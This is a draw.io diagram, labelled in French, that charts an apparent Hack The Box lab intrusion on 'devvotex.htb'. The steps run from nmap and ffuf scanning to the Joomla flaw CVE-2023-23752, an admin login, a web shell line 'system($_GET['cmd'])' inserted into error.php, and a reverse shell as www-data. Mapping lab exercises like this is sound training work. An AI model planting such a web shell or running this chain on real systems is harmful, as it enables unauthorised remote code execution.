<mxfile host="app.diagrams.net" modified="2024-03-10T22:04:53.673Z" agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" etag="v2OiUxW5Recrz3vfclMJ" version="24.0.4" type="device">
  <diagram name="Page-1" id="fSlS8oabnRGwb62cCXCo">
    <mxGraphModel dx="1623" dy="687" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="850" pageHeight="1100" math="0" shadow="0">
      <root>
        <mxCell id="0" />
        <mxCell id="1" parent="0" />
        <mxCell id="uvpVoe7wBzEXG3321W0v-2" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;" edge="1" parent="1" source="uvpVoe7wBzEXG3321W0v-1" target="uvpVoe7wBzEXG3321W0v-3">
          <mxGeometry relative="1" as="geometry">
            <mxPoint x="570" y="430" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <UserObject label="10.10.11.242" link="10.10.11.242" id="uvpVoe7wBzEXG3321W0v-1">
          <mxCell style="rounded=1;whiteSpace=wrap;html=1;" vertex="1" parent="1">
            <mxGeometry x="510" y="290" width="120" height="60" as="geometry" />
          </mxCell>
        </UserObject>
        <mxCell id="uvpVoe7wBzEXG3321W0v-4" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;" edge="1" parent="1" source="uvpVoe7wBzEXG3321W0v-3" target="uvpVoe7wBzEXG3321W0v-5">
          <mxGeometry relative="1" as="geometry">
            <mxPoint x="450" y="450" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="uvpVoe7wBzEXG3321W0v-3" value="nmap" style="text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;" vertex="1" parent="1">
          <mxGeometry x="540" y="390" width="60" height="30" as="geometry" />
        </mxCell>
        <mxCell id="uvpVoe7wBzEXG3321W0v-8" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;" edge="1" parent="1" source="uvpVoe7wBzEXG3321W0v-5" target="uvpVoe7wBzEXG3321W0v-9">
          <mxGeometry relative="1" as="geometry">
            <mxPoint x="340" y="500" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="uvpVoe7wBzEXG3321W0v-5" value="http" style="rounded=1;whiteSpace=wrap;html=1;" vertex="1" parent="1">
          <mxGeometry x="310" y="440" width="60" height="20" as="geometry" />
        </mxCell>
        <mxCell id="uvpVoe7wBzEXG3321W0v-6" value="ssh" style="rounded=1;whiteSpace=wrap;html=1;" vertex="1" parent="1">
          <mxGeometry x="690" y="440" width="70" height="20" as="geometry" />
        </mxCell>
        <mxCell id="uvpVoe7wBzEXG3321W0v-7" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;entryX=0.564;entryY=-0.022;entryDx=0;entryDy=0;entryPerimeter=0;" edge="1" parent="1" source="uvpVoe7wBzEXG3321W0v-3" target="uvpVoe7wBzEXG3321W0v-6">
          <mxGeometry relative="1" as="geometry" />
        </mxCell>
        <mxCell id="uvpVoe7wBzEXG3321W0v-10" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;" edge="1" parent="1" source="uvpVoe7wBzEXG3321W0v-9" target="uvpVoe7wBzEXG3321W0v-11">
          <mxGeometry relative="1" as="geometry">
            <mxPoint x="260" y="540" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="uvpVoe7wBzEXG3321W0v-13" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;" edge="1" parent="1" source="uvpVoe7wBzEXG3321W0v-9" target="uvpVoe7wBzEXG3321W0v-12">
          <mxGeometry relative="1" as="geometry" />
        </mxCell>
        <mxCell id="uvpVoe7wBzEXG3321W0v-9" value="ffuz" style="text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;" vertex="1" parent="1">
          <mxGeometry x="310" y="485" width="60" height="30" as="geometry" />
        </mxCell>
        <mxCell id="uvpVoe7wBzEXG3321W0v-11" value="devvotex.htb" style="text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;" vertex="1" parent="1">
          <mxGeometry x="160" y="520" width="80" height="30" as="geometry" />
        </mxCell>
        <mxCell id="uvpVoe7wBzEXG3321W0v-14" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;" edge="1" parent="1" source="uvpVoe7wBzEXG3321W0v-12" target="uvpVoe7wBzEXG3321W0v-15">
          <mxGeometry relative="1" as="geometry">
            <mxPoint x="479.9999999999998" y="580" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="uvpVoe7wBzEXG3321W0v-12" value="dev.devvotex.htb" style="text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;" vertex="1" parent="1">
          <mxGeometry x="430" y="520" width="80" height="30" as="geometry" />
        </mxCell>
        <mxCell id="uvpVoe7wBzEXG3321W0v-16" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;" edge="1" parent="1" source="uvpVoe7wBzEXG3321W0v-15" target="uvpVoe7wBzEXG3321W0v-18">
          <mxGeometry relative="1" as="geometry">
            <mxPoint x="470.0000000000002" y="625" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="uvpVoe7wBzEXG3321W0v-15" value="nuclei" style="text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;" vertex="1" parent="1">
          <mxGeometry x="439.9999999999998" y="580" width="60" height="30" as="geometry" />
        </mxCell>
        <mxCell id="uvpVoe7wBzEXG3321W0v-19" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;" edge="1" parent="1" source="uvpVoe7wBzEXG3321W0v-18" target="uvpVoe7wBzEXG3321W0v-20">
          <mxGeometry relative="1" as="geometry">
            <mxPoint x="470.0000000000002" y="750" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="uvpVoe7wBzEXG3321W0v-21" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;" edge="1" parent="1" source="uvpVoe7wBzEXG3321W0v-18" target="uvpVoe7wBzEXG3321W0v-22">
          <mxGeometry relative="1" as="geometry">
            <mxPoint x="340" y="670" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="uvpVoe7wBzEXG3321W0v-18" value="cve sur joomla&lt;div&gt;(outil de déploiement web)&lt;/div&gt;&lt;div&gt;CVE-2023-23752&lt;br&gt;&lt;/div&gt;" style="rounded=1;whiteSpace=wrap;html=1;" vertex="1" parent="1">
          <mxGeometry x="410.0000000000002" y="640" width="120" height="60" as="geometry" />
        </mxCell>
        <mxCell id="uvpVoe7wBzEXG3321W0v-26" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;" edge="1" parent="1" source="uvpVoe7wBzEXG3321W0v-20" target="uvpVoe7wBzEXG3321W0v-27">
          <mxGeometry relative="1" as="geometry">
            <mxPoint x="469.9999999999998" y="849.9999999999998" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="uvpVoe7wBzEXG3321W0v-20" value="connexion à l&#39;interface joomla de configuration du site" style="text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;" vertex="1" parent="1">
          <mxGeometry x="397.5" y="780" width="145" height="50" as="geometry" />
        </mxCell>
        <mxCell id="uvpVoe7wBzEXG3321W0v-25" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" edge="1" parent="1" source="uvpVoe7wBzEXG3321W0v-22" target="uvpVoe7wBzEXG3321W0v-20">
          <mxGeometry relative="1" as="geometry">
            <Array as="points">
              <mxPoint x="310" y="805" />
            </Array>
          </mxGeometry>
        </mxCell>
        <mxCell id="uvpVoe7wBzEXG3321W0v-22" value="user:mdp" style="text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;" vertex="1" parent="1">
          <mxGeometry x="280" y="655" width="60" height="30" as="geometry" />
        </mxCell>
        <mxCell id="uvpVoe7wBzEXG3321W0v-28" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;" edge="1" parent="1" source="uvpVoe7wBzEXG3321W0v-27" target="uvpVoe7wBzEXG3321W0v-29">
          <mxGeometry relative="1" as="geometry">
            <mxPoint x="469.9999999999998" y="909.9999999999998" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="uvpVoe7wBzEXG3321W0v-27" value="error.php,&amp;nbsp;&lt;span data-slate-fragment=&quot;JTdCJTIyb2JqZWN0JTIyJTNBJTIyZG9jdW1lbnQlMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIybm9kZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJibG9jayUyMiUyQyUyMnR5cGUlMjIlM0ElMjJwYXJhZ3JhcGglMjIlMkMlMjJpc1ZvaWQlMjIlM0FmYWxzZSUyQyUyMmRhdGElMjIlM0ElN0IlN0QlMkMlMjJub2RlcyUyMiUzQSU1QiU3QiUyMm9iamVjdCUyMiUzQSUyMnRleHQlMjIlMkMlMjJsZWF2ZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJsZWFmJTIyJTJDJTIydGV4dCUyMiUzQSUyMnN5c3RlbSglMjRfR0VUJTVCJ2NtZCclNUQpJTNCJTIyJTJDJTIybWFya3MlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJtYXJrJTIyJTJDJTIydHlwZSUyMiUzQSUyMmJvbGQlMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTdEJTJDJTdCJTIyb2JqZWN0JTIyJTNBJTIybWFyayUyMiUyQyUyMnR5cGUlMjIlM0ElMjJjb2RlJTIyJTJDJTIyZGF0YSUyMiUzQSU3QiU3RCU3RCU1RCU3RCU1RCUyQyUyMmtleSUyMiUzQSUyMnQxSlBqM2F2M0Q4ZCUyMiU3RCU1RCUyQyUyMmtleSUyMiUzQSUyMkRTU0hMNDA5bWlSVSUyMiU3RCU1RCUyQyUyMmtleSUyMiUzQSUyMmRmbVhsQzNTQ3RPOSUyMiU3RA==&quot; style=&quot;white-space: pre;&quot;&gt;system($_GET[&#39;cmd&#39;]);&lt;/span&gt;" style="text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;" vertex="1" parent="1">
          <mxGeometry x="375" y="860" width="190" height="20" as="geometry" />
        </mxCell>
        <mxCell id="uvpVoe7wBzEXG3321W0v-31" value="" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;" edge="1" parent="1" source="uvpVoe7wBzEXG3321W0v-29" target="uvpVoe7wBzEXG3321W0v-30">
          <mxGeometry relative="1" as="geometry" />
        </mxCell>
        <mxCell id="uvpVoe7wBzEXG3321W0v-29" value="mise en place d&#39;un revershell&lt;div&gt;user: www-data&lt;/div&gt;" style="text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;" vertex="1" parent="1">
          <mxGeometry x="435" y="930" width="70" height="55" as="geometry" />
        </mxCell>
        <mxCell id="uvpVoe7wBzEXG3321W0v-30" value="read user.txt de /home/logan ?" style="text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;" vertex="1" parent="1">
          <mxGeometry x="290" y="1000" width="107.5" height="40" as="geometry" />
        </mxCell>
      </root>
    </mxGraphModel>
  </diagram>
</mxfile>
